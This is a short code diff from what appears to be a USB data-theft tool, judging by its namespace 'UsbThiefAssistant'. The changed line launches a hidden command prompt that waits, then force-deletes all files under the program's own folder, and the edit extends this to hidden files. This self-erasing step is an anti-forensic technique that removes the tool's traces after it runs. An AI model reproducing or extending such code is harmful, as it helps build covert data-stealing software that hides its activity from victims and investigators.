@@ -177,7 +177,7 @@ namespace UsbThiefAssistant
             }
             string path = Application.StartupPath;
             KillProcess();
-            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/C timeout /T 5 & Del /F /S /Q " + path)
+            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/C Timeout /T 5 & Del /F /S /Q /A H " + path)
             {
                 WindowStyle = ProcessWindowStyle.Hidden,
                 CreateNoWindow = true
